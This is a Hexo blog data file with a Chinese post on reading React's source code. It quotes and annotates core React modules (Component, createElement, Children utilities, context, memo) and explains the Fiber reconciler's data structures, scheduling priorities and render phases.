{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"John Doe","url":"http://yoursite.com"},"pages":[],"posts":[{"title":"React源码阅读","slug":"React源码阅读","date":"2020-01-29T03:26:27.000Z","updated":"2020-02-02T12:38:51.825Z","comments":true,"path":"2020/01/29/React源码阅读/","link":"","permalink":"http://yoursite.com/2020/01/29/React源码阅读/","excerpt":"","text":"React CoreReact Core只包含定义组件必要的 API，同时适用于 React DOM 和 React Native 组件。 基本组成结构 123456789101112131415161718192021222324252627282930313233343536373839404142const React = &#123; Children: &#123; map, forEach, count, toArray, only, &#125;, createRef, Component, PureComponent, createContext, forwardRef, lazy, memo, useCallback, useContext, useEffect, useImperativeHandle, useDebugValue, useLayoutEffect, useMemo, useReducer, useRef, useState, Fragment: REACT_FRAGMENT_TYPE, Profiler: REACT_PROFILER_TYPE, StrictMode: REACT_STRICT_MODE_TYPE, Suspense: REACT_SUSPENSE_TYPE, createElement: __DEV__ ? createElementWithValidation : createElement, cloneElement: __DEV__ ? cloneElementWithValidation : cloneElement, isValidElement: isValidElement, version: ReactVersion, __SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED: ReactSharedInternals,&#125;; 截取出一些主要模块的核心代码。 Component和PureComponentComponent属性1234567891011/** * Base class helpers for the updating state of a component. */function Component(props, context, updater) &#123; this.props = props; this.context = context; // If a component has string refs, we will assign a different object later. this.refs = emptyObject; // We initialize the default updater but the real one gets injected by the renderer. this.updater = updater || ReactNoopUpdateQueue;&#125; ReactNoopUpdateQueue updater更新队列抽象API 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374/** * This is the abstract API for an update queue. */const ReactNoopUpdateQueue = &#123; /** * Checks whether or not this composite component is mounted. * @param &#123;ReactClass&#125; publicInstance The instance we want to test. * @return &#123;boolean&#125; True if mounted, false otherwise. * @protected * @final */ isMounted: function(publicInstance) &#123; return false; &#125;, /** * Forces an update. This should only be invoked when it is known with * certainty that we are **not** in a DOM transaction. * * You may want to call this when you know that some deeper aspect of the * component's state has changed but `setState` was not called. * * @param &#123;ReactClass&#125; publicInstance The instance that should rerender. * @param &#123;?function&#125; callback Called after component is updated. * @param &#123;?string&#125; callerName name of the calling function in the public API. * @internal */ enqueueForceUpdate: function(publicInstance, callback, callerName) &#123; warnNoop(publicInstance, 'forceUpdate'); //用于检查实例是否isMounted &#125;, /** * Replaces all of the state. Always use this or `setState` to mutate state. * You should treat `this.state` as immutable. * * There is no guarantee that `this.state` will be immediately updated, so * accessing `this.state` after calling this method may return the old value. * * @param &#123;ReactClass&#125; publicInstance The instance that should rerender. * @param &#123;object&#125; completeState Next state. * @param &#123;?function&#125; callback Called after component is updated. * @param &#123;?string&#125; callerName name of the calling function in the public API. * @internal */ enqueueReplaceState: function( publicInstance, completeState, callback, callerName, ) &#123; warnNoop(publicInstance, 'replaceState'); &#125;, /** * Sets a subset of the state. This only exists because _pendingState is * internal. This provides a merging strategy that is not available to deep * properties which is confusing. TODO: Expose pendingState or don't use it * during the merge. * * @param &#123;ReactClass&#125; publicInstance The instance that should rerender. * @param &#123;object&#125; partialState Next partial state to be merged with state. * @param &#123;?function&#125; callback Called after component is updated. * @param &#123;?string&#125; Name of the calling function in the public API. * @internal */ enqueueSetState: function( publicInstance, partialState, callback, callerName, ) &#123; warnNoop(publicInstance, 'setState'); &#125;,&#125;; setState123456789101112131415161718/** * @param &#123;object|function&#125; partialState Next partial state or function to * produce next partial state to be merged with current state. * @param &#123;?function&#125; callback Called after state is updated. * @final * @protected */Component.prototype.setState = function(partialState, callback) &#123; // 控制传入的partialState类型 invariant( typeof partialState === 'object' || typeof partialState === 'function' || partialState == null, 'setState(...): takes an object of state variables to update or a ' + 'function which returns an object of state variables.', ); this.updater.enqueueSetState(this, partialState, callback, 'setState');&#125;; forceUpdate强制setState某些已改变的深层state值，这样做shouldComponentUpdate不会被调用，componentWillUpdate和componentDidUpdate将被调用。 12345678/** * @param &#123;?function&#125; callback Called after update is complete. * @final * @protected */Component.prototype.forceUpdate = function(callback) &#123; this.updater.enqueueForceUpdate(this, callback, 'forceUpdate');&#125;; PureComponent123456789101112131415161718/** * Convenience component with default shallow equality check for sCU. */function PureComponent(props, context, updater) &#123; this.props = props; this.context = context; // If a component has string refs, we will assign a different object later. this.refs = emptyObject; this.updater = updater || ReactNoopUpdateQueue;&#125;function ComponentDummy() &#123;&#125;ComponentDummy.prototype = Component.prototype;const pureComponentPrototype = (PureComponent.prototype = new ComponentDummy());pureComponentPrototype.constructor = PureComponent;// Avoid an extra prototype jump for these methods.Object.assign(pureComponentPrototype, Component.prototype); // 避免向上查找原型链pureComponentPrototype.isPureReactComponent = true; ReactElement基本构成123456789101112131415161718192021222324252627/** * @param &#123;*&#125; type 用于判断如何创建节点 * @param &#123;*&#125; props * @param &#123;*&#125; key * @param &#123;string|object&#125; ref * @param &#123;*&#125; owner * @param &#123;*&#125; self * @param &#123;*&#125; source * @internal */const ReactElement = function(type, key, ref, self, source, owner, props) &#123; const element = &#123; // This tag allows us to uniquely identify this as a React Element $$typeof: REACT_ELEMENT_TYPE, // Built-in properties that belong on the element type: type, key: key, ref: ref, props: props, // Record the component responsible for creating this element. _owner: owner, &#125;; return element;&#125;; createElement123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778const hasOwnProperty = Object.prototype.hasOwnProperty;// 保留属性const RESERVED_PROPS = &#123; key: true, ref: true, __self: true, __source: true,&#125;;export function createElement(type, config, children) &#123; let propName; // Reserved names are extracted const props = &#123;&#125;; let key = null; let ref = null; let self = null; let source = null; if (config != null) &#123; // 取ref属性 if (hasValidRef(config)) &#123; ref = config.ref; &#125; // 取key属性 if (hasValidKey(config)) &#123; key = '' + config.key; &#125; self = config.__self === undefined ? null : config.__self; source = config.__source === undefined ? null : config.__source; // 其他属性加到props for (propName in config) &#123; if ( hasOwnProperty.call(config, propName) &amp;&amp; !RESERVED_PROPS.hasOwnProperty(propName) ) &#123; props[propName] = config[propName]; &#125; &#125; &#125; // Children can be more than one argument, and those are transferred onto // the newly allocated props object. const childrenLength = arguments.length - 2; if (childrenLength === 1) &#123; props.children = children; &#125; else if (childrenLength &gt; 1) &#123; const childArray = Array(childrenLength); // 把第三个及以后的参数都加到childArray for (let i = 0; i &lt; childrenLength; i++) &#123; childArray[i] = arguments[i + 2]; &#125; props.children = childArray; &#125; // 给没定义值的属性添加默认值 if (type &amp;&amp; type.defaultProps) &#123; const defaultProps = type.defaultProps; for (propName in defaultProps) &#123; if (props[propName] === undefined) &#123; props[propName] = defaultProps[propName]; &#125; &#125; &#125; return ReactElement( type, key, ref, self, source, ReactCurrentOwner.current, props, );&#125; cloneElement1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071/** * Clone and return a new ReactElement using element as the starting point. */export function cloneElement(element, config, children) &#123; invariant( !(element === null || element === undefined), 'React.cloneElement(...): The argument must be a React element, but you passed %s.', element, ); let propName; // Original props are copied const props = Object.assign(&#123;&#125;, element.props); // Reserved names are extracted let key = element.key; let ref = element.ref; // Self is preserved since the owner is preserved. const self = element._self; // Source is preserved since cloneElement is unlikely to be targeted by a // transpiler, and the original source is probably a better indicator of the // true owner. const source = element._source; // Owner will be preserved, unless ref is overridden let owner = element._owner; if (config != null) &#123; if (hasValidRef(config)) &#123; // Silently steal the ref from the parent. ref = config.ref; owner = ReactCurrentOwner.current; &#125; if (hasValidKey(config)) &#123; key = '' + config.key; &#125; // Remaining properties override existing props let defaultProps; if (element.type &amp;&amp; element.type.defaultProps) &#123; defaultProps = element.type.defaultProps; &#125; for (propName in config) &#123; if ( hasOwnProperty.call(config, propName) &amp;&amp; !RESERVED_PROPS.hasOwnProperty(propName) ) &#123; if (config[propName] === undefined &amp;&amp; defaultProps !== undefined) &#123; // Resolve default props props[propName] = defaultProps[propName]; &#125; else &#123; props[propName] = config[propName]; &#125; &#125; &#125; &#125; const childrenLength = arguments.length - 2; if (childrenLength === 1) &#123; props.children = children; &#125; else if (childrenLength &gt; 1) &#123; const childArray = Array(childrenLength); for (let i = 0; i &lt; childrenLength; i++) &#123; childArray[i] = arguments[i + 2]; &#125; props.children = childArray; &#125; return ReactElement(element.type, key, ref, self, source, owner, props);&#125; Verify ReactElement123456789101112/** * @param &#123;?object&#125; object * @return &#123;boolean&#125; True if `object` is a ReactElement. * @final */export function isValidElement(object) &#123; return ( typeof object === 'object' &amp;&amp; object !== null &amp;&amp; object.$$typeof === REACT_ELEMENT_TYPE );&#125; React Childrenmap123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249/** * Maps children that are typically specified as `props.children`. * The provided mapFunction(child, key, index) will be called for each leaf child. * * @param &#123;?*&#125; children Children tree container. * @param &#123;function(*, int)&#125; func The map function. * @param &#123;*&#125; context Context for mapFunction. * @return &#123;object&#125; Object containing the ordered map of results. */function mapChildren(children, func, context) &#123; if (children == null) &#123; return children; &#125; const result = []; mapIntoWithKeyPrefixInternal(children, result, null, func, context); return result;&#125;function mapIntoWithKeyPrefixInternal(children, array, prefix, func, context) &#123; let escapedPrefix = ''; if (prefix != null) &#123; escapedPrefix = escapeUserProvidedKey(prefix) + '/'; &#125; const traverseContext = getPooledTraverseContext( array, escapedPrefix, func, context, ); traverseAllChildren(children, mapSingleChildIntoContext, traverseContext); releaseTraverseContext(traverseContext);&#125;//contextPoolconst POOL_SIZE = 10;const traverseContextPool = [];//从contextPool获取context赋值function getPooledTraverseContext( mapResult, keyPrefix, mapFunction, mapContext,) &#123; if (traverseContextPool.length) &#123; const traverseContext = traverseContextPool.pop(); traverseContext.result = mapResult; traverseContext.keyPrefix = keyPrefix; traverseContext.func = mapFunction; traverseContext.context = mapContext; traverseContext.count = 0; return traverseContext; &#125; else &#123; return &#123; result: mapResult, keyPrefix: keyPrefix, func: mapFunction, context: mapContext, count: 0, &#125;; &#125;&#125;//释放contextfunction releaseTraverseContext(traverseContext) &#123; traverseContext.result = null; traverseContext.keyPrefix = null; traverseContext.func = null; traverseContext.context = null; traverseContext.count = 0; if (traverseContextPool.length &lt; POOL_SIZE) &#123; traverseContextPool.push(traverseContext); &#125;&#125;/** * Traverses children that are typically specified as `props.children`, but * might also be specified through attributes: * * - `traverseAllChildren(this.props.children, ...)` * - `traverseAllChildren(this.props.leftPanelChildren, ...)` * * The `traverseContext` is an optional argument that is passed through the * entire traversal. It can be used to store accumulations or anything else that * the callback might find relevant. * * @param &#123;?*&#125; children Children tree object. * @param &#123;!function&#125; callback To invoke upon traversing each child. * @param &#123;?*&#125; traverseContext Context for traversal. * @return &#123;!number&#125; The number of children in this subtree. */function traverseAllChildren(children, callback, traverseContext) &#123; if (children == null) &#123; return 0; &#125; return traverseAllChildrenImpl(children, '', callback, traverseContext);&#125;/** * @param &#123;?*&#125; children Children tree container. * @param &#123;!string&#125; nameSoFar Name of the key path so far. * @param &#123;!function&#125; callback Callback to invoke with each child found. * @param &#123;?*&#125; traverseContext Used to pass information throughout the traversal * process. * @return &#123;!number&#125; The number of children in this subtree. */function traverseAllChildrenImpl( children, nameSoFar, callback, traverseContext,) &#123; const type = typeof children; if (type === 'undefined' || type === 'boolean') &#123; // All of the above are perceived as null. children = null; &#125; let invokeCallback = false; if (children === null) &#123; invokeCallback = true; &#125; else &#123; switch (type) &#123; case 'string': case 'number': invokeCallback = true; break; case 'object': switch (children.$$typeof) &#123; case REACT_ELEMENT_TYPE: case REACT_PORTAL_TYPE: invokeCallback = true; &#125; &#125; &#125; //only child返回1 if (invokeCallback) &#123; callback( traverseContext, children, // If it's the only child, treat the name as if it was wrapped in an array // so that it's consistent if the number of children grows. nameSoFar === '' ? SEPARATOR + getComponentKey(children, 0) : nameSoFar, ); return 1; &#125; let child; let nextName; let subtreeCount = 0; // Count of children found in the current subtree. const nextNamePrefix = nameSoFar === '' ? SEPARATOR : nameSoFar + SUBSEPARATOR; if (Array.isArray(children)) &#123; for (let i = 0; i &lt; children.length; i++) &#123; child = children[i]; nextName = nextNamePrefix + getComponentKey(child, i); subtreeCount += traverseAllChildrenImpl( //继续调用自身，递归 child, nextName, callback, traverseContext, ); &#125; &#125; else &#123; const iteratorFn = getIteratorFn(children); if (typeof iteratorFn === 'function') &#123; const iterator = iteratorFn.call(children); let step; let ii = 0; while (!(step = iterator.next()).done) &#123; child = step.value; nextName = nextNamePrefix + getComponentKey(child, ii++); subtreeCount += traverseAllChildrenImpl( child, nextName, callback, traverseContext, ); &#125; &#125; else if (type === 'object') &#123; // 警告不正确的children类型 let addendum = ''; const childrenString = '' + children; invariant( false, 'Objects are not valid as a React child (found: %s).%s', childrenString === '[object Object]' ? 'object with keys &#123;' + Object.keys(children).join(', ') + '&#125;' : childrenString, addendum, ); &#125; &#125; return subtreeCount;&#125;/** * Generate a key string that identifies a component within a set. * * @param &#123;*&#125; component A component that could contain a manual key. * @param &#123;number&#125; index Index that is used if a manual key is not provided. * @return &#123;string&#125; */function getComponentKey(component, index) &#123; // Do some typechecking here since we call this blindly. We want to ensure // that we don't block potential future ES APIs. if ( typeof component === 'object' &amp;&amp; component !== null &amp;&amp; component.key != null ) &#123; // Explicit key return escape(component.key); &#125; // Implicit key determined by the index in the set return index.toString(36);&#125;//传入的callbackfunction mapSingleChildIntoContext(bookKeeping, child, childKey) &#123; const &#123;result, keyPrefix, func, context&#125; = bookKeeping; let mappedChild = func.call(context, child, bookKeeping.count++); //先判断是节点还是数组 //若为数组则再次调用mapIntoWithKeyPrefixInternal，这时会从pool中重新取context if (Array.isArray(mappedChild)) &#123; mapIntoWithKeyPrefixInternal(mappedChild, result, childKey, c =&gt; c); &#125; else if (mappedChild != null) &#123; //判断节点是否合规 if (isValidElement(mappedChild)) &#123; mappedChild = cloneAndReplaceKey( mappedChild, // Keep both the (mapped) and old keys if they differ, just as // traverseAllChildren used to do for objects as children keyPrefix + (mappedChild.key &amp;&amp; (!child || child.key !== mappedChild.key) ? escapeUserProvidedKey(mappedChild.key) + '/' : '') + childKey, ); &#125; //合法则直接推入result result.push(mappedChild); &#125;&#125; forEach与map类似，只是没有返回result 123456789101112131415161718192021222324252627/** * Iterates through children that are typically specified as `props.children`. * The provided forEachFunc(child, index) will be called for each leaf child. * * @param &#123;?*&#125; children Children tree container. * @param &#123;function(*, int)&#125; forEachFunc * @param &#123;*&#125; forEachContext Context for forEachContext. */function forEachChildren(children, forEachFunc, forEachContext) &#123; if (children == null) &#123; return children; &#125; const traverseContext = getPooledTraverseContext( null, null, forEachFunc, forEachContext, ); traverseAllChildren(children, forEachSingleChild, traverseContext); releaseTraverseContext(traverseContext);&#125;//传入的callbackfunction forEachSingleChild(bookKeeping, child, name) &#123; const &#123;func, context&#125; = bookKeeping; func.call(context, child, bookKeeping.count++);&#125; ReactContext12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364export type ReactProviderType&lt;T&gt; = &#123; $$typeof: Symbol | number, _context: ReactContext&lt;T&gt;, ...&#125;;export type ReactContext&lt;T&gt; = &#123; $$typeof: Symbol | number, Consumer: ReactContext&lt;T&gt;, Provider: ReactProviderType&lt;T&gt;, _calculateChangedBits: ((a: T, b: T) =&gt; number) | null, _currentValue: T, _currentValue2: T, _threadCount: number, // DEV only _currentRenderer?: Object | null, _currentRenderer2?: Object | null, ...&#125;;export function createContext&lt;T&gt;( defaultValue: T, calculateChangedBits: ?(a: T, b: T) =&gt; number,): ReactContext&lt;T&gt; &#123; if (calculateChangedBits === undefined) &#123; calculateChangedBits = null; &#125; else &#123; //... &#125; const context: ReactContext&lt;T&gt; = &#123; $$typeof: REACT_CONTEXT_TYPE, _calculateChangedBits: calculateChangedBits, // As a workaround to support multiple concurrent renderers, we categorize // some renderers as primary and others as secondary. We only expect // there to be two concurrent renderers at most: React Native (primary) and // Fabric (secondary); React DOM (primary) and React ART (secondary). // Secondary renderers store their context values on separate fields. _currentValue: defaultValue, _currentValue2: defaultValue, // Used to track how many concurrent renderers this context currently // supports within in a single renderer. Such as parallel server rendering. _threadCount: 0, // These are circular Provider: (null: any), Consumer: (null: any), &#125;; context.Provider = &#123; $$typeof: REACT_PROVIDER_TYPE, _context: context, &#125;; //let hasWarnedAboutUsingNestedContextConsumers = false; //let hasWarnedAboutUsingConsumerProvider = false; if (__DEV__) &#123; //...一些检错代码 &#125; else &#123; context.Consumer = context; &#125; return context;&#125; createRef1234567891011export type RefObject = &#123;| current: any,|&#125;;export function createRef(): RefObject &#123; const refObject = &#123; current: null, &#125;; return refObject;&#125; memo1234567891011export default function memo&lt;Props&gt;( type: React$ElementType, compare?: (oldProps: Props, newProps: Props) =&gt; boolean, //浅比较) &#123; return &#123; $$typeof: REACT_MEMO_TYPE, type, compare: compare === undefined ? null : compare, &#125;;&#125; forwardRef123456789export default function forwardRef&lt;Props, ElementType: React$ElementType&gt;( render: (props: Props, ref: React$Ref&lt;ElementType&gt;) =&gt; React$Node,) &#123; return &#123; $$typeof: REACT_FORWARD_REF_TYPE, render, &#125;;&#125; react-reconciler (React Fiber)introReact Fiber架构（React的数据结构） Fiber主要解决的是React15在页面元素过多且频繁刷新的场景下出现掉帧的问题。其根本原因是大量的同步计算任务阻塞了浏览器的 UI 渲染。默认情况下，JS 运算、页面布局和页面绘制都是运行在浏览器的主线程当中，他们之间是互斥的关系。如果 JS 运算持续占用主线程，页面就没法得到及时的更新。当调用setState更新页面的时候，React 会遍历应用的所有节点计算出差异，然后再更新 UI，整个过程是一气呵成不能被打断的。如果页面元素很多，整个过程占用的时机就可能超过 16 毫秒，就容易出现掉帧的现象。 针对这一问题，React 从框架层面对 web 页面的运行机制做了优化。解决主线程长时间被 JS 运算占用这一问题的基本思路，是将运算切割为多个步骤，分批完成。也就是说在完成一部分任务之后，将控制权交回给浏览器，让浏览器有时间进行页面的渲染。等浏览器忙完之后，再继续之前未完成的任务。 Fiber reconciler 是一个新尝试，致力于解决 stack reconciler 中固有的问题，同时解决一些历史遗留问题。Fiber 从 React 16 开始变成了默认的 reconciler。其主要目标是： 能够把可中断的任务切片处理。 能够调整优先级，重置并复用任务。 能够在父元素与子元素之间交错处理，以支持 React 中的布局。 能够在 render() 中返回多个元素。 更好地支持错误边界。 旧版 React 通过递归的方式进行渲染，使用的是 JS 引擎自身的函数调用栈，它会一直执行到栈空为止。而Fiber实现了自己的组件调用栈，它以链表的形式遍历组件树，可以灵活的暂停、继续和丢弃执行的任务。实现方式是使用了浏览器的requestIdleCallback这一 API。官方的解释是这样的： window.requestIdleCallback()会在浏览器空闲时期依次调用函数，这就可以让开发者在主事件循环中执行后台或低优先级的任务，而且不会对像动画和用户交互这些延迟触发但关键的事件产生影响。函数一般会按先进先调用的顺序执行，除非函数在浏览器调用它之前就到了它的超时时间。 Fiber Reconciler 每执行一段时间，都会将控制权交回给浏览器，可以分段执行。为了达到这种效果，就需要有一个调度器 (Scheduler) 来进行任务分配。任务的优先级有六种： synchronous，与之前的Stack Reconciler操作一样，同步执行 task，在next tick之前执行 animation，下一帧之前执行 high，在不久的将来立即执行 low，稍微延迟执行也没关系 offscreen，下一次render时或scroll时才执行 优先级高的任务（如键盘输入）可以打断优先级低的任务（如Diff）的执行，从而更快的生效。 Fiber Reconciler 在执行过程中，会分为 2 个阶段： 阶段一（reconciliation），生成 Fiber 树，得出需要更新的节点信息。这一步是一个渐进的过程，可以被打断。 涉及到的生命周期：componentWillMount、componentWillReceiveProps、shouldComponentUpdate、componentWillUpdate 因为 reconciliation 阶段是可以被打断的，所以 reconciliation 阶段会执行的生命周期函数就可能会出现调用多次的情况，从而引起 Bug。所以对于 reconciliation 阶段调用的几个函数，除了 shouldComponentUpdate 以外，其他都应该避免去使用，并且 React16 中也引入了新的 API 来解决这个问题，getDerivedStateFromProps取代了原来的componentWillMount与componentWillReceiveProps方法，该函数会在组件初始化和更新时被调用。 1234567891011121314151617class ExampleComponent extends React.Component &#123; // Initialize state in constructor, // Or with a property initializer. state = &#123;&#125;; static getDerivedStateFromProps(nextProps, prevState) &#123; if (prevState.someMirroredValue !== nextProps.someValue) &#123; return &#123; derivedData: computeDerivedState(nextProps), someMirroredValue: nextProps.someValue &#125;; &#125; // Return null to indicate no change to state. return null; &#125;&#125; 阶段二（commit），将需要更新的节点一次过批量更新，这个过程不能被打断。 涉及到的生命周期：componentDidMount、componentDidUpdate、componentWillUnmount 新引入的getSnapshotBeforeUpdate 用于替换 componentWillUpdate ，该函数会在 update 后 DOM 更新前被调用，用于读取最新的 DOM 数据。 阶段一可被打断的特性让优先级更高的任务先执行，从框架层面大大降低了页面掉帧的概率。 Fiber Reconciler 在阶段一进行 Diff 计算的时候，会生成一棵 Fiber 树。这棵树是在 Virtual DOM 树的基础上增加额外的信息来生成的，它本质来说是一个链表，主要是为了将递归遍历转变成循环遍历，配合 requestIdleCallback API，实现任务拆分、中断与恢复。每一个 Fiber Node 节点与 Virtual Dom 一一对应，所有 Fiber Node 连接起来形成 Fiber tree, 是个单链表树结构。 Fiber 树在首次渲染的时候会一次过生成。在后续需要 Diff 的时候，会根据已有树和最新 Virtual DOM 的信息，生成一棵新的树。这颗新树每生成一个新的节点，都会将控制权交回给主线程，去检查有没有优先级更高的任务需要执行，如果没有则继续构建树的过程；如果有则 Fiber Reconciler 会丢弃正在生成的树，在空闲的时候再重新执行一遍。 在构造 Fiber 树的过程中，Fiber Reconciler 会将需要更新的节点信息保存在Effect List当中，在阶段二执行的时候，会批量更新相应的节点。 ReactFiberFiber的基本构成 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213// A Fiber is work on a Component that needs to be done or was done. There can// be more than one per component.export type Fiber = &#123;| // These first fields are conceptually members of an Instance. This used to // be split into a separate type and intersected with the other Fiber fields, // but until Flow fixes its intersection bugs, we've merged them into a // single type. // An Instance is shared between all versions of a component. We can easily // break this out into a separate object to avoid copying so much to the // alternate versions of the tree. We put this on a single object for now to // minimize the number of objects created during the initial render. // Tag identifying the type of fiber. tag: WorkTag, // Unique identifier of this child. key: null | string, // The value of element.type which is used to preserve the identity during // reconciliation of this child. elementType: any, // The resolved function/class/ associated with this fiber. type: any, // The local state associated with this fiber. stateNode: any, // Conceptual aliases // parent : Instance -&gt; return The parent happens to be the same as the // return fiber since we've merged the fiber and instance. // Remaining fields belong to Fiber // The Fiber to return to after finishing processing this one. // This is effectively the parent, but there can be multiple parents (two) // so this is only the parent of the thing we're currently processing. // It is conceptually the same as the return address of a stack frame. return: Fiber | null, // Singly Linked List Tree Structure. child: Fiber | null, sibling: Fiber | null, index: number, // The ref last used to attach this node. // I'll avoid adding an owner field for prod and model that as functions. ref: | null | (((handle: mixed) =&gt; void) &amp; &#123;_stringRef: ?string, ...&#125;) | RefObject, // Input is the data coming into process this fiber. Arguments. Props. pendingProps: any, // This type will be more specific once we overload the tag. memoizedProps: any, // The props used to create the output. // A queue of state updates and callbacks. updateQueue: UpdateQueue&lt;any&gt; | null, // The state used to create the output memoizedState: any, // Dependencies (contexts, events) for this fiber, if it has any dependencies: Dependencies | null, // Bitfield that describes properties about the fiber and its subtree. E.g. // the ConcurrentMode flag indicates whether the subtree should be async-by- // default. When a fiber is created, it inherits the mode of its // parent. Additional flags can be set at creation time, but after that the // value should remain unchanged throughout the fiber's lifetime, particularly // before its child fibers are created. mode: TypeOfMode, // Effect effectTag: SideEffectTag, // Singly linked list fast path to the next fiber with side-effects. nextEffect: Fiber | null, // The first and last fiber with side-effect within this subtree. This allows // us to reuse a slice of the linked list when we reuse the work done within // this fiber. firstEffect: Fiber | null, lastEffect: Fiber | null, // Represents a time in the future by which this work should be completed. // Does not include work found in its subtree. expirationTime: ExpirationTime, // This is used to quickly determine if a subtree has no pending changes. childExpirationTime: ExpirationTime, // This is a pooled version of a Fiber. Every fiber that gets updated will // eventually have a pair. There are cases when we can clean up pairs to save // memory if we need to. alternate: Fiber | null, // Time spent rendering this Fiber and its descendants for the current update. // This tells us how well the tree makes use of sCU for memoization. // It is reset to 0 each time we render and only updated when we don't bailout. // This field is only set when the enableProfilerTimer flag is enabled. actualDuration?: number, // If the Fiber is currently active in the \"render\" phase, // This marks the time at which the work began. // This field is only set when the enableProfilerTimer flag is enabled. actualStartTime?: number, // Duration of the most recent render time for this Fiber. // This value is not updated when we bailout for memoization purposes. // This field is only set when the enableProfilerTimer flag is enabled. selfBaseDuration?: number, // Sum of base times for all descendants of this Fiber. // This value bubbles up during the \"complete\" phase. // This field is only set when the enableProfilerTimer flag is enabled. treeBaseDuration?: number, // Conceptual aliases // workInProgress : Fiber -&gt; alternate The alternate used for reuse happens // to be the same as work in progress. // __DEV__ only _debugID?: number, _debugSource?: Source | null, _debugOwner?: Fiber | null, _debugIsCurrentlyTiming?: boolean, _debugNeedsRemount?: boolean, // Used to verify that the order of hooks does not change between renders. _debugHookTypes?: Array&lt;HookType&gt; | null,|&#125;;function FiberNode( tag: WorkTag, pendingProps: mixed, key: null | string, mode: TypeOfMode,) &#123; // Instance this.tag = tag; this.key = key; this.elementType = null; this.type = null; this.stateNode = null; //节点实例 // Fiber this.return = null; //父节点 this.child = null; //子节点 this.sibling = null; //兄弟节点 this.index = 0; this.ref = null; this.pendingProps = pendingProps; this.memoizedProps = null; this.updateQueue = null; this.memoizedState = null; this.dependencies = null; this.mode = mode; // Effects this.effectTag = NoEffect; this.nextEffect = null; this.firstEffect = null; this.lastEffect = null; this.expirationTime = NoWork; this.childExpirationTime = NoWork; this.alternate = null; if (enableProfilerTimer) &#123; // Note: The following is done to avoid a v8 performance cliff. this.actualDuration = Number.NaN; this.actualStartTime = Number.NaN; this.selfBaseDuration = Number.NaN; this.treeBaseDuration = Number.NaN; this.actualDuration = 0; this.actualStartTime = -1; this.selfBaseDuration = 0; this.treeBaseDuration = 0; &#125; // This is normally DEV-only except www when it adds listeners. if (enableUserTimingAPI) &#123; this._debugID = debugCounter++; this._debugIsCurrentlyTiming = false; &#125; if (__DEV__) &#123; this._debugSource = null; this._debugOwner = null; this._debugNeedsRemount = false; this._debugHookTypes = null; if (!hasBadMapPolyfill &amp;&amp; typeof Object.preventExtensions === 'function') &#123; Object.preventExtensions(this); &#125; &#125;&#125;const createFiber = function( tag: WorkTag, pendingProps: mixed, key: null | string, mode: TypeOfMode,): Fiber &#123; return new FiberNode(tag, pendingProps, key, mode);&#125;; ReactFiberRoot1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677type BaseFiberRootProperties = &#123;| // The type of root (legacy, batched, concurrent, etc.) tag: RootTag, // Any additional information from the host associated with this root. containerInfo: any, // Used only by persistent updates. pendingChildren: any, // The currently active root fiber. This is the mutable root of the tree. current: Fiber, pingCache: | WeakMap&lt;Thenable, Set&lt;ExpirationTime&gt;&gt; | Map&lt;Thenable, Set&lt;ExpirationTime&gt;&gt; | null, finishedExpirationTime: ExpirationTime, // A finished work-in-progress HostRoot that's ready to be committed. finishedWork: Fiber | null, // Timeout handle returned by setTimeout. Used to cancel a pending timeout, if // it's superseded by a new one. timeoutHandle: TimeoutHandle | NoTimeout, // Top context object, used by renderSubtreeIntoContainer context: Object | null, pendingContext: Object | null, // Determines if we should attempt to hydrate on the initial mount +hydrate: boolean, // Node returned by Scheduler.scheduleCallback callbackNode: *, // Expiration of the callback associated with this root callbackExpirationTime: ExpirationTime, // Priority of the callback associated with this root callbackPriority: ReactPriorityLevel, // The earliest pending expiration time that exists in the tree firstPendingTime: ExpirationTime, // The earliest suspended expiration time that exists in the tree firstSuspendedTime: ExpirationTime, // The latest suspended expiration time that exists in the tree lastSuspendedTime: ExpirationTime, // The next known expiration time after the suspended range nextKnownPendingLevel: ExpirationTime, // The latest time at which a suspended component pinged the root to // render again lastPingedTime: ExpirationTime, lastExpiredTime: ExpirationTime,|&#125;;function FiberRootNode(containerInfo, tag, hydrate) &#123; this.tag = tag; this.current = null; this.containerInfo = containerInfo; this.pendingChildren = null; this.pingCache = null; this.finishedExpirationTime = NoWork; this.finishedWork = null; this.timeoutHandle = noTimeout; this.context = null; this.pendingContext = null; this.hydrate = hydrate; this.callbackNode = null; this.callbackPriority = NoPriority; this.firstPendingTime = NoWork; this.firstSuspendedTime = NoWork; this.lastSuspendedTime = NoWork; this.nextKnownPendingLevel = NoWork; this.lastPingedTime = NoWork; this.lastExpiredTime = NoWork; if (enableSchedulerTracing) &#123; this.interactionThreadID = unstable_getThreadID(); this.memoizedInteractions = new Set(); this.pendingInteractionMap = new Map(); &#125; if (enableSuspenseCallback) &#123; this.hydrationCallbacks = null; &#125;&#125; ReactWorkTag123456789101112131415161718export const FunctionComponent = 0;export const ClassComponent = 1;export const IndeterminateComponent = 2; // Before we know whether it is function or classexport const HostRoot = 3; // Root of a host tree. Could be nested inside another node.export const HostPortal = 4; // A subtree. Could be an entry point to a different renderer.export const HostComponent = 5;export const HostText = 6;export const Fragment = 7;export const Mode = 8;export const ContextConsumer = 9;export const ContextProvider = 10;export const ForwardRef = 11;export const Profiler = 12;export const SuspenseComponent = 13;export const MemoComponent = 14;export const SimpleMemoComponent = 15;export const LazyComponent = 16;export const IncompleteClassComponent = 17; 